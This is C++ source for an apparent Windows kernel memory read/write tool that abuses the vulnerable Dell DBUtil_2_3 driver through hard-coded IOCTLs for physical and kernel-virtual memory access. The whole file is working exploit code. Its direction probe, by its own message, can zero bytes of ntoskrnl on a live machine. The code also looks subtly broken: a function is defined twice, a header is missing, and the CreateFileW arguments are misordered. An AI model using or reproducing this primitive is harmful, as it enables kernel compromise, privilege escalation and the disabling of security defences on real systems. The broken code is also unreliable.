#include "r0.hpp"
#include "vmm.hpp"
#include <windows.h>
#include <winternl.h>
#include <cstring>
#include <cstdio>

// Global state - at true global scope (outside any namespace)
Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev,
                   do_read, do_write, do_vwrite, do_vread};
const Backend* g_be = nullptr;

// IOCTL constants - global
constexpr DWORD kPhysRead  = 0x9B0C1F40;
constexpr DWORD kPhysWrite = 0x9B0C1F44;
constexpr DWORD kKernRead  = 0x9B0C1EC4;
constexpr DWORD kKernWrite = 0x9B0C1EC8;

constexpr size_t kPhysHdr = 0x10;
constexpr size_t kKernHdr = 0x18;

// Global variables
HANDLE g_dev = INVALID_HANDLE_VALUE;
bool g_vread_ok = false;

// Physical read/write
bool do_read(uint64_t pa, void* out, size_t len) {
    if (!g_be) return false;
    return g_be->read(pa, out, len);
}

bool do_write(uint64_t pa, const void* in, size_t len) {
    if (!g_be) return false;
    return g_be->write(pa, in, len);
}

// Kernel-virtual read/write
bool do_vread(uint64_t va, void* out, size_t len) {
    if (!g_be) return false;
    return g_be->vread(va, out, len);
}

bool do_vwrite(uint64_t va, const void* in, size_t len) {
    if (!g_be) return false;
    return g_be->vwrite(va, in, len);
}

// Driver entry-point helpers
bool open_dev() {
    g_dev = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | FILE_SHARE_READ,
                        nullptr,
                        OPEN_EXISTING, 0, nullptr);
    return g_dev != INVALID_HANDLE_VALUE;
}

void close_dev() {
    if (g_dev != INVALID_HANDLE_VALUE) { CloseHandle(g_dev); g_dev = INVALID_HANDLE_VALUE; }
}

// Initialisation
bool init() {
    static const uint64_t kProbePa[] = { 0x400, 0x410, 0x420, 0x1000, 0x2000 };
    bool any = false;
    uint8_t test_data[16]{};

    for (uint64_t pa : kProbePa) {
        if (!do_read(pa, test_data, sizeof(test_data))) {
            printf("[!] physical read failed at 0x%llx (IOCTL 0x%08X)\n",
                   (unsigned long long)pa, (unsigned)kPhysRead);
            close_dev();
            return false;
        }
        for (size_t i = 0; i < sizeof(test_data); i++) {
            if (test_data[i] != 0) any = true;
        }
        if (any) break;
    }
    if (!any) {
        printf("[!] physical reads returned all zeros - IOCTL pair swapped?\n");
        close_dev();
        return false;
    }

    g_be = &g_be_local;
    return true;
}

void shutdown() {
    g_be = nullptr;
}

bool alive() { return g_be != nullptr; }

void set_backend(const Backend* be) { g_be = be; }

bool pread(uint64_t pa, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->read(pa, buf, len);
}

bool pwrite(uint64_t pa, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->write(pa, buf, len);
}

bool vread(uint64_t va, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vread(va, buf, len);
}

bool vwrite(uint64_t va, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vwrite(va, buf, len);
}

bool vread_ready() {
    return g_vread_ok;
}

// Direction probe for the kernel-VA pair
namespace {

int try_vread(uint64_t va, size_t len, bool payload, bool& zero_back) {
    zero_back = false;
    std::vector<uint8_t> in(kKernHdr, 0);
    memcpy(in.data() + 0x08, &va, 8);

    std::vector<uint8_t> in_full(kKernHdr + (payload ? len : 0), 0);
    memcpy(in_full.data() + 0x08, &va, 8);

    std::vector<uint8_t> out(kKernHdr + len, 0xCC);
    DWORD got = 0;
    int rc = -1;
    if (!payload) {
        rc = DeviceIoControl(g_dev, kKernRead, in.data(), (DWORD)in.size(),
                             out.data(), (DWORD)out.size(), &got, nullptr) ? 1 : -1;
    } else {
        rc = DeviceIoControl(g_dev, kKernRead, in_full.data(), (DWORD)in_full.size(),
                             out.data(), (DWORD)out.size(), &got, nullptr) ? 1 : -1;
    }
    if (rc == -1) return -1;

    static const uint8_t mz[2] = { 'M', 'Z' };
    if (len >= 2) {
        if (memcmp(out.data() + kKernHdr, mz, 2) == 0) return 1;
        if (memcmp(out.data(), mz, 2) == 0) return 1;
    }

    if (payload) {
        bool z = true;
        for (size_t i = 0; i < len; ++i) if (out[kKernHdr + i]) { z = false; break; }
        zero_back = z;
    }
    return 0;
}

} // namespace closes here

bool vread_probe(uint64_t va, size_t len) {
    if (g_vread_ok) return true;
    if (g_dev == INVALID_HANDLE_VALUE || !len || len > 64) return false;
    if (va < 0xFFFF800000000000ull) return false;

    bool zb = false;
    if (try_vread(va, len, false, zb) == 1) {
        g_vread_ok = true;
        return true;
    }

    if (try_vread(va, len, true, zb) == 1) {
        g_vread_ok = true;
        return true;
    }

    if (zb) {
        vmm::g_ntos_mz_broken = true;
        printf("[!] kernel-VA pair is TRANSPOSED: 0x%08X behaves as a write. "
               "ntoskrnl+0 now holds 00 00; header paths are degraded for this "
               "boot.\n", (unsigned)kKernRead);
    }
    return false;
}

bool vread_ready() { return g_vread_ok; }